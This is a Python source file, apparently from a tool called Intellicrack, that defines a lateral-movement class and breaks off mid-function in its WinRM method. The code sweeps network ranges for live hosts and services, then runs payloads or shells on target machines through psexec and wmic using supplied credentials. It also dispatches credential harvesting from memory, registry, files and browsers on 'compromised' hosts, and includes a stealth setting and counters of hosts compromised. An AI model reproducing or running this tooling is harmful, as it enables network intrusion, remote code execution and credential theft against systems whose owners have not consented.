"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import ipaddress
import logging
import os
import platform
import re
import shlex
import shutil
import socket
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Any

from intellicrack.utils.http_utils import secure_get, secure_post, secure_put
from intellicrack.utils.subprocess_security import secure_run

from .base_exploitation import BaseExploitation
from .base_persistence import BasePersistence

"""
Lateral Movement Module

Implements various lateral movement techniques for network traversal
including credential harvesting, network enumeration, and remote execution.
"""

logger = logging.getLogger(__name__)


class LateralMovement(BasePersistence, BaseExploitation):
    """Lateral movement capabilities for network traversal and remote access."""

    def __init__(self):
        """Initialize the lateral movement system."""
        self.logger = logging.getLogger(__name__)

        # Network discovery results
        self.discovered_hosts = []
        self.discovered_services = {}
        self.discovered_shares = {}
        self.discovered_credentials = []

        # Movement techniques
        self.techniques = {
            "smb": self._smb_lateral_movement,
            "wmi": self._wmi_lateral_movement,
            "psexec": self._psexec_lateral_movement,
            "winrm": self._winrm_lateral_movement,
            "rdp": self._rdp_lateral_movement,
            "ssh": self._ssh_lateral_movement,
            "powershell": self._powershell_lateral_movement,
        }

        # Current context
        self.current_host = None
        self.current_user = None
        self.current_privileges = None

        # Persistence mechanisms
        self.persistence_methods = []

        # Stealth settings
        self.stealth_mode = True
        self.cleanup_on_exit = True

        # Statistics
        self.stats = {
            "hosts_compromised": 0,
            "credentials_harvested": 0,
            "services_exploited": 0,
            "persistence_installed": 0,
        }

        # Platform detection
        self.platform = platform.system().lower()
        self.is_windows = self.platform == "windows"
        self.is_linux = self.platform == "linux"
        self.is_macos = self.platform == "darwin"

        # Initialize platform-specific modules
        if self.is_windows:
            self._initialize_windows_modules()
        elif self.is_linux:
            self._initialize_linux_modules()
        elif self.is_macos:
            self._initialize_macos_modules()

        # Network tools
        self.nmap_available = self._check_tool_availability("nmap")
        self.masscan_available = self._check_tool_availability("masscan")
        self.crackmapexec_available = self._check_tool_availability("crackmapexec")

        # Credential store
        self.credential_store = {
            "passwords": [],
            "hashes": [],
            "tickets": [],
            "tokens": [],
            "certificates": [],
        }

        # Target management
        self.targets = []
        self.compromised_targets = []
        self.failed_targets = []

        # Session management
        self.active_sessions = {}
        self.session_counter = 0

        self.logger.info("Lateral movement system initialized")
        self.logger.info(f"Platform: {self.platform}")
        self.logger.info(
            f"Available tools: nmap={self.nmap_available}, masscan={self.masscan_available}, crackmapexec={self.crackmapexec_available}"
        )

        # Load configuration
        self._load_configuration()

        # Initialize scanning engines
        self._initialize_scanning_engines()

    def discover_network(self, networks: list[str], discovery_methods: list[str] | None = None, max_threads: int = 50) -> dict[str, Any]:
        """Discover network targets and services.

        Args:
            networks: List of network ranges to scan (CIDR notation)
            discovery_methods: List of discovery methods to use
            max_threads: Maximum number of concurrent threads

        Returns:
            Discovery results with identified targets

        """
        result = {
            "success": False,
            "targets": {},
            "total_hosts": 0,
            "live_hosts": 0,
            "services_found": 0,
            "scan_time": 0,
            "error": None,
        }

        if discovery_methods is None:
            discovery_methods = ["ping_sweep", "port_scan"]

        start_time = time.time()

        try:
            self.logger.info("Starting network discovery of %s networks", len(networks))

            # Generate target IP list
            target_ips = []
            for network in networks:
                try:
                    net = ipaddress.ip_network(network, strict=False)
                    target_ips.extend([str(ip) for ip in net.hosts()])
                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.warning("Invalid network range %s: %s", network, e)

            result["total_hosts"] = len(target_ips)

            if not target_ips:
                result["error"] = "No valid target IPs generated"
                return result

            # Execute discovery methods
            targets = {}

            for method in discovery_methods:
                if method in self.discovery_methods:
                    self.logger.info("Running %s on %s targets", method, len(target_ips))

                    method_func = self.discovery_methods[method]
                    method_results = method_func(target_ips, max_threads)

                    # Merge results
                    for ip, target_info in method_results.items():
                        if ip not in targets:
                            targets[ip] = {
                                "ip": ip,
                                "hostname": None,
                                "os": None,
                                "services": [],
                                "open_ports": [],
                                "discovery_methods": [],
                            }

                        targets[ip]["discovery_methods"].append(method)

                        # Merge target information
                        if target_info.get("hostname"):
                            targets[ip]["hostname"] = target_info["hostname"]
                        if target_info.get("os"):
                            targets[ip]["os"] = target_info["os"]
                        if "services" in target_info:
                            targets[ip]["services"].extend(target_info["services"])
                        if "open_ports" in target_info:
                            targets[ip]["open_ports"].extend(target_info["open_ports"])

            # Clean up and deduplicate
            for _ip, target in targets.items():
                target["services"] = list(set(target["services"]))
                target["open_ports"] = list(set(target["open_ports"]))

            result["targets"] = targets
            result["live_hosts"] = len(targets)
            result["services_found"] = sum(len(t["services"]) for t in targets.values())
            result["scan_time"] = time.time() - start_time
            result["success"] = True

            # Store discovered targets
            self.discovered_targets.update(targets)

            self.logger.info("Discovery complete: %s/%s hosts live", result["live_hosts"], result["total_hosts"])
            return result

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Network discovery failed: %s", e)
            result["error"] = str(e)
            result["scan_time"] = time.time() - start_time
            return result

    def attempt_lateral_movement(
        self,
        target_ip: str,
        credentials: dict[str, Any],
        techniques: list[str] | None = None,
        payload_path: str | None = None,
    ) -> dict[str, Any]:
        """Attempt lateral movement to target host.

        Args:
            target_ip: Target IP address
            credentials: Authentication credentials
            techniques: List of movement techniques to try
            payload_path: Path to payload for execution

        Returns:
            Results of lateral movement attempt

        """
        result = {
            "success": False,
            "target_ip": target_ip,
            "techniques_attempted": [],
            "successful_technique": None,
            "session_id": None,
            "error": None,
        }

        try:
            self.logger.info("Attempting lateral movement to %s", target_ip)

            # Get target information
            target_info = self.discovered_targets.get(target_ip, {})
            target_os = target_info.get("os", "unknown")

            # Auto-detect OS if not known
            if target_os == "unknown":
                target_os = self._detect_target_os(target_ip, target_info)

            # Select techniques based on target OS
            if techniques is None:
                techniques = self._select_movement_techniques(target_os, target_info)

            # Attempt each technique
            for technique in techniques:
                self.logger.info("Trying %s on %s", technique, target_ip)
                result["techniques_attempted"].append(technique)

                try:
                    movement_result = self._execute_movement_technique(
                        target_ip,
                        target_os,
                        technique,
                        credentials,
                        payload_path,
                    )

                    if movement_result and movement_result.get("success", False):
                        result["success"] = True
                        result["successful_technique"] = technique
                        result["session_id"] = movement_result.get("session_id")

                        # Store active session
                        if result["session_id"]:
                            self.active_sessions[result["session_id"]] = {
                                "target_ip": target_ip,
                                "technique": technique,
                                "credentials": credentials,
                                "created_at": time.time(),
                                "details": movement_result.get("details", {}),
                            }

                        self.logger.info("Lateral movement successful: %s", technique)
                        break

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.debug("Technique %s failed: %s", technique, e)
                    continue

            if not result["success"]:
                result["error"] = "All lateral movement techniques failed"

            return result

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Lateral movement failed: %s", e)
            result["error"] = str(e)
            return result

    def execute_command(self, session_id: str, command: str, timeout: int = 30) -> dict[str, Any]:
        """Execute command on remote host through established session.

        Args:
            session_id: Session identifier
            command: Command to execute
            timeout: Command timeout in seconds

        Returns:
            Command execution results

        """
        result = {
            "success": False,
            "command": command,
            "output": "",
            "error": None,
            "exit_code": None,
        }

        try:
            session_info = self.validate_session(session_id, self.active_sessions, result)
            if not session_info:
                return result
            technique = session_info["technique"]
            target_ip = session_info["target_ip"]

            self.logger.info("Executing command on %s via %s", target_ip, technique)

            # Execute command based on technique
            if technique == "ssh":
                execution_result = self._execute_ssh_command(session_info, command, timeout)
            elif technique == "winrm":
                execution_result = self._execute_winrm_command(session_info, command, timeout)
            elif technique == "psexec":
                execution_result = self._execute_psexec_command(session_info, command, timeout)
            else:
                execution_result = self._execute_generic_command(session_info, command, timeout)

            result.update(execution_result)

            return result

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Command execution failed: %s", e)
            result["error"] = str(e)
            return result

    def harvest_credentials(self, session_id: str, methods: list[str] | None = None) -> dict[str, Any]:
        """Harvest credentials from compromised host.

        Args:
            session_id: Session identifier
            methods: List of credential harvesting methods

        Returns:
            Harvested credentials

        """
        result = {
            "success": False,
            "credentials": {},
            "methods_used": [],
            "error": None,
        }

        if methods is None:
            methods = ["memory_dump", "registry_dump", "file_search", "browser_data"]

        try:
            session_info = self.validate_session(session_id, self.active_sessions, result)
            if not session_info:
                return result
            target_ip = session_info["target_ip"]

            self.logger.info("Harvesting credentials from %s", target_ip)

            credentials = {}

            for method in methods:
                try:
                    if method == "memory_dump":
                        creds = self._harvest_memory_credentials(session_info)
                    elif method == "registry_dump":
                        creds = self._harvest_registry_credentials(session_info)
                    elif method == "file_search":
                        creds = self._harvest_file_credentials(session_info)
                    elif method == "browser_data":
                        creds = self._harvest_browser_credentials(session_info)
                    else:
                        continue

                    if creds:
                        credentials[method] = creds
                        result["methods_used"].append(method)

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.debug("Credential harvest method %s failed: %s", method, e)

            result["credentials"] = credentials
            result["success"] = len(credentials) > 0

            if result["success"]:
                self.logger.info("Harvested credentials using %s methods", len(result["methods_used"]))
            else:
                result["error"] = "No credentials harvested"

            return result

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("Credential harvesting failed: %s", e)
            result["error"] = str(e)
            return result

    # Discovery methods implementation

    def _ping_sweep(self, target_ips: list[str], max_threads: int) -> dict[str, dict[str, Any]]:
        """Perform ping sweep to identify live hosts."""
        live_hosts = {}

        def ping_host(ip):
            try:
                if os.name == "nt":
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        ["ping", "-n", "1", "-w", "1000", ip],  # noqa: S607
                        check=False,
                        capture_output=True,
                        text=True,
                        shell=False,
                    )
                else:
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        ["ping", "-c", "1", "-W", "1", ip],  # noqa: S607
                        check=False,
                        capture_output=True,
                        text=True,
                        shell=False,
                    )

                if result.returncode == 0:
                    return ip, {"alive": True}
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
                ConnectionError,
            ) as e:
                self.logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                    e,
                )
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(ping_host, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    live_hosts[ip] = result

        return live_hosts

    def _port_scan(self, target_ips: list[str], max_threads: int) -> dict[str, dict[str, Any]]:
        """Perform port scan on common ports."""
        scan_results = {}
        common_ports = [
            22,
            23,
            25,
            53,
            80,
            110,
            135,
            139,
            143,
            443,
            445,
            993,
            995,
            1723,
            3306,
            3389,
            5432,
            5900,
        ]

        def scan_port(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()

                if result == 0:
                    return ip, port, True
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
                ConnectionError,
            ) as e:
                self.logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                    e,
                )
            return ip, port, False

        def scan_host(ip):
            open_ports = []
            services = []

            for port in common_ports:
                _, _, is_open = scan_port(ip, port)
                if is_open:
                    open_ports.append(port)

                    # Identify service
                    for service, service_port in self.service_ports.items():
                        if port == service_port:
                            services.append(service)
                            break

            if open_ports:
                return ip, {
                    "open_ports": open_ports,
                    "services": services,
                }
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_host, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    scan_results[ip] = result

        return scan_results

    def _arp_scan(self, target_ips: list[str], max_threads: int) -> dict[str, dict[str, Any]]:
        """Perform ARP scan for local network hosts."""
        arp_results = {}

        try:
            # Use max_threads to control concurrent ARP queries
            self.logger.debug(
                "ARP scan initiated with max_threads=%s for %s targets",
                max_threads,
                len(target_ips),
            )

            # First get system ARP table
            if os.name == "nt":
                result = subprocess.run(["arp", "-a"], check=False, capture_output=True, text=True, shell=False)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607
            else:
                result = subprocess.run(["arp", "-a"], check=False, capture_output=True, text=True, shell=False)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607

            # Parse ARP table
            arp_table = {}
            if result.returncode == 0:
                for line in result.stdout.split("\n"):
                    if "dynamic" in line.lower() or "(" in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            ip = parts[1].strip("()")
                            mac = parts[0] if os.name == "nt" else parts[2] if len(parts) > 2 else "unknown"
                            arp_table[ip] = mac

            # Function to check individual IP with ARP ping if not in table
            def check_arp(ip):
                try:
                    # First check if already in ARP table
                    if ip in arp_table:
                        return {"arp_entry": True, "mac": arp_table[ip], "source": "cache"}

                    # Try ARP ping to populate table (platform-specific)
                    if os.name == "nt":
                        # Windows: ping to populate ARP cache
                        try:
                            secure_run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                ["ping", "-n", "1", "-w", "100", ip],  # noqa: S607
                                check=False,
                                capture_output=True,
                                timeout=1,
                            )
                        except TypeError as e:
                            logger.error("Type error in lateral_movement.py: %s", e)
                            # Fallback for older Python versions
                            secure_run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                ["ping", "-n", "1", "-w", "100", ip],  # noqa: S607
                                check=False,
                                capture_output=True,
                            )
                    else:
                        # Linux: try arping if available
                        try:
                            try:
                                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    ["arping", "-c", "1", "-w", "1", ip],  # noqa: S607
                                    check=False,
                                    capture_output=True,
                                    text=True,
                                    timeout=2,
                                )
                            except TypeError as e:
                                logger.error("Type error in lateral_movement.py: %s", e)
                                # Fallback for older Python versions
                                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    ["arping", "-c", "1", "-w", "1", ip],  # noqa: S607
                                    check=False,
                                    capture_output=True,
                                    text=True,
                                )
                            if result.returncode == 0 and "bytes from" in result.stdout:
                                # Extract MAC from arping output
                                for line in result.stdout.split("\n"):
                                    if "bytes from" in line:
                                        mac_match = line.split()
                                        if len(mac_match) >= 4:
                                            return {
                                                "arp_entry": True,
                                                "mac": mac_match[3],
                                                "source": "arping",
                                            }
                        except FileNotFoundError as e:
                            logger.error("File not found in lateral_movement.py: %s", e)
                            # arping not available, fall back to ping
                            secure_run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                ["ping", "-c", "1", "-W", "1", ip],  # noqa: S607
                                check=False,
                                capture_output=True,
                                timeout=1,
                            )

                    # Re-check ARP table after ping
                    arp_path = shutil.which("arp")
                    if arp_path:
                        if os.name == "nt":
                            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                [arp_path, "-a", ip],
                                check=False,
                                capture_output=True,
                                text=True,
                                shell=False,  # Explicitly secure - using list format prevents shell injection
                            )
                        else:
                            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                [arp_path, "-n", ip],
                                check=False,
                                capture_output=True,
                                text=True,
                                shell=False,  # Explicitly secure - using list format prevents shell injection
                            )

                        if result and result.returncode == 0:
                            for line in result.stdout.split("\n"):
                                if ip in line:
                                    parts = line.split()
                                    if len(parts) >= 2:
                                        mac = parts[1] if os.name == "nt" else parts[2] if len(parts) > 2 else "unknown"
                                        return {
                                            "arp_entry": True,
                                            "mac": mac,
                                            "source": "ping_populate",
                                        }

                    return {"arp_entry": False}

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.debug("ARP check failed for %s: %s", ip, e)
                    return {"arp_entry": False, "error": str(e)}

            # Use threading to check multiple IPs concurrently
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_ip = {executor.submit(check_arp, ip): ip for ip in target_ips}

                for future in future_to_ip:
                    ip = future_to_ip[future]
                    try:
                        result = future.result(timeout=5)
                        if result.get("arp_entry"):
                            arp_results[ip] = result
                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        subprocess.SubprocessError,
                        ConnectionError,
                    ) as e:
                        self.logger.debug("ARP scan thread failed for %s: %s", ip, e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.debug("ARP scan failed: %s", e)

        self.logger.debug("ARP scan completed using %s threads, found %s entries", max_threads, len(arp_results))
        return arp_results

    def _dns_enumeration(self, target_ips: list[str], max_threads: int) -> dict[str, dict[str, Any]]:
        """Perform DNS enumeration."""
        dns_results = {}

        def resolve_hostname(ip):
            try:
                hostname = socket.gethostbyaddr(ip)[0]
                return ip, {"hostname": hostname}
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
                ConnectionError,
            ) as e:
                self.logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                    e,
                )
                return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(resolve_hostname, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    dns_results[ip] = result

        return dns_results

    def _netbios_scan(self, target_ips: list[str], max_threads: int) -> dict[str, dict[str, Any]]:
        """Perform NetBIOS name scanning."""
        netbios_results = {}

        def scan_netbios(ip):
            try:
                # This would use actual NetBIOS scanning
                # Simplified implementation
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, 139))
                sock.close()

                if result == 0:
                    return ip, {
                        "netbios": True,
                        "services": ["netbios"],
                    }
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
                ConnectionError,
            ) as e:
                self.logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                    e,
                )
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_netbios, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    netbios_results[ip] = result

        return netbios_results

    def _smb_enumeration(self, target_ips: list[str], max_threads: int) -> dict[str, dict[str, Any]]:
        """Perform SMB enumeration."""
        smb_results = {}

        def scan_smb(ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, 445))
                sock.close()

                if result == 0:
                    return ip, {
                        "smb": True,
                        "services": ["smb"],
                        "os": "windows",
                    }
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
                ConnectionError,
            ) as e:
                self.logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                    e,
                )
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_smb, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    smb_results[ip] = result

        return smb_results

    def _ldap_enumeration(self, target_ips: list[str], max_threads: int) -> dict[str, dict[str, Any]]:
        """Perform LDAP enumeration."""
        ldap_results = {}

        def scan_ldap(ip):
            try:
                for port in [389, 636]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((ip, port))
                    sock.close()

                    if result == 0:
                        return ip, {
                            "ldap": True,
                            "services": ["ldap"],
                            "ldap_port": port,
                        }
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
                ConnectionError,
            ) as e:
                self.logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                    e,
                )
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_ldap, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    ldap_results[ip] = result

        return ldap_results

    def _snmp_enumeration(self, target_ips: list[str], max_threads: int) -> dict[str, dict[str, Any]]:
        """Perform SNMP enumeration."""
        snmp_results = {}

        def scan_snmp(ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)

                # Simple SNMP community string test
                # This would use proper SNMP library in real implementation
                sock.sendto(b"public", (ip, 161))

                return ip, {
                    "snmp": True,
                    "services": ["snmp"],
                }
            except (
                FileNotFoundError,
                PermissionError,
                OSError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                subprocess.SubprocessError,
                ConnectionError,
            ) as e:
                self.logger.error(
                    "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                    e,
                )
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_snmp, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    snmp_results[ip] = result

        return snmp_results

    # Movement technique implementations

    def _detect_target_os(self, target_ip: str, target_info: dict[str, Any]) -> str:
        """Detect target operating system."""
        self.logger.debug("Detecting OS for target %s", target_ip)

        # Check for Windows-specific services
        if "smb" in target_info.get("services", []) or 445 in target_info.get("open_ports", []):
            self.logger.debug("Target %s identified as Windows (SMB detected)", target_ip)
            return "windows"
        # Check for SSH (more common on Linux)
        if "ssh" in target_info.get("services", []) or 22 in target_info.get("open_ports", []):
            self.logger.debug("Target %s identified as Linux (SSH detected)", target_ip)
            return "linux"
        self.logger.debug("Target %s OS unknown", target_ip)
        return "unknown"

    def _select_movement_techniques(self, target_os: str, target_info: dict[str, Any]) -> list[str]:
        """Select appropriate movement techniques based on target."""
        techniques = []

        if target_os == "windows":
            services = target_info.get("services", [])
            if "smb" in services:
                techniques.extend(["psexec", "wmi_exec"])
            if "winrm" in services:
                techniques.append("winrm")
            if "rdp" in services:
                techniques.append("rdp")

            # Default Windows techniques
            if not techniques:
                techniques = ["psexec", "wmi_exec", "scheduled_task"]

        elif target_os == "linux":
            services = target_info.get("services", [])
            if "ssh" in services:
                techniques.extend(["ssh", "ssh_key"])
            if "docker_api" in services:
                techniques.append("docker_api")

            # Default Linux techniques
            if not techniques:
                techniques = ["ssh", "ssh_key"]

        return techniques

    def _execute_movement_technique(
        self,
        target_ip: str,
        target_os: str,
        technique: str,
        credentials: dict[str, Any],
        payload_path: str | None,
    ) -> dict[str, Any]:
        """Execute specific movement technique."""
        if target_os in self.movement_techniques:
            if technique in self.movement_techniques[target_os]:
                technique_func = self.movement_techniques[target_os][technique]
                return technique_func(target_ip, credentials, payload_path)

        return {"success": False, "error": f"Technique {technique} not available for {target_os}"}

    # Windows movement techniques

    def _windows_psexec(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """PsExec lateral movement."""
        result = {
            "success": False,
            "session_id": None,
            "details": {},
            "error": None,
        }

        try:
            username = credentials.get("username")
            password = credentials.get("password")
            domain = credentials.get("domain", ".")

            if not username or not password:
                result["error"] = "Username and password required for PsExec"
                return result

            # Generate session ID
            session_id = self._generate_session_id()

            # Construct PsExec command
            psexec_path = shutil.which("psexec")
            if not psexec_path:
                result["error"] = "psexec command not found in PATH"
                return result

            if payload_path:
                process = secure_run(
                    [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        psexec_path,
                        f"\\\\{target_ip}",
                        "-u",
                        f"{domain}\\{username}",
                        "-p",
                        password,
                        payload_path,
                    ],
                    check=False,
                    capture_output=True,
                    text=True,
                    shell=False,
                )  # Explicitly secure - using list format prevents shell injection
            else:
                process = secure_run(
                    [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        psexec_path,
                        f"\\\\{target_ip}",
                        "-u",
                        f"{domain}\\{username}",
                        "-p",
                        password,
                        "cmd",
                    ],
                    check=False,
                    capture_output=True,
                    text=True,
                    shell=False,
                )  # Explicitly secure - using list format prevents shell injection

            if process.returncode == 0:
                result["success"] = True
                result["session_id"] = session_id
                result["details"] = {
                    "method": "psexec",
                    "target_ip": target_ip,
                    "username": username,
                    "command": payload_path if payload_path else "cmd",
                }
            else:
                result["error"] = f"PsExec failed: {process.stderr}"

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _windows_wmi_exec(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """WMI execution lateral movement."""
        result = {
            "success": False,
            "session_id": None,
            "details": {},
            "error": None,
        }

        try:
            username = credentials.get("username")
            password = credentials.get("password")

            if not username or not password:
                result["error"] = "Username and password required for WMI"
                return result

            session_id = self._generate_session_id()

            # Construct WMI command
            wmic_path = shutil.which("wmic")
            if not wmic_path:
                result["error"] = "wmic command not found in PATH"
                return result

            if payload_path:
                process = secure_run(
                    [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        wmic_path,
                        f"/node:{target_ip}",
                        f"/user:{username}",
                        f"/password:{password}",
                        "process",
                        "call",
                        "create",
                        payload_path,
                    ],
                    check=False,
                    capture_output=True,
                    text=True,
                    shell=False,
                )  # Explicitly secure - using list format prevents shell injection
            else:
                process = secure_run(
                    [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        wmic_path,
                        f"/node:{target_ip}",
                        f"/user:{username}",
                        f"/password:{password}",
                        "process",
                        "call",
                        "create",
                        "cmd.exe",
                    ],
                    check=False,
                    capture_output=True,
                    text=True,
                    shell=False,
                )  # Explicitly secure - using list format prevents shell injection

            if process.returncode == 0 and "ReturnValue = 0" in process.stdout:
                result["success"] = True
                result["session_id"] = session_id
                result["details"] = {
                    "method": "wmi_exec",
                    "target_ip": target_ip,
                    "username": username,
                }
            else:
                result["error"] = f"WMI execution failed: {process.stderr}"

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _windows_winrm(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """WinRM lateral movement."""
        result = {
            "success": False,
            "session_id": None,
            "details": {},
            "error": None,
        }

        try:
            username = credentials.get("username")
            password = credentials.get("password")

            if not username or not password:
                result["error"] = "Username and password required for WinRM"
                return result

            session_id = self._generate_session_id()

            # Test WinRM connection
            winrs_path = shutil.which("winrs")
            if not winrs_path:
                result["error"] = "winrs command not found in PATH"
                return result

            process = secure_run(
                [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    winrs_path,
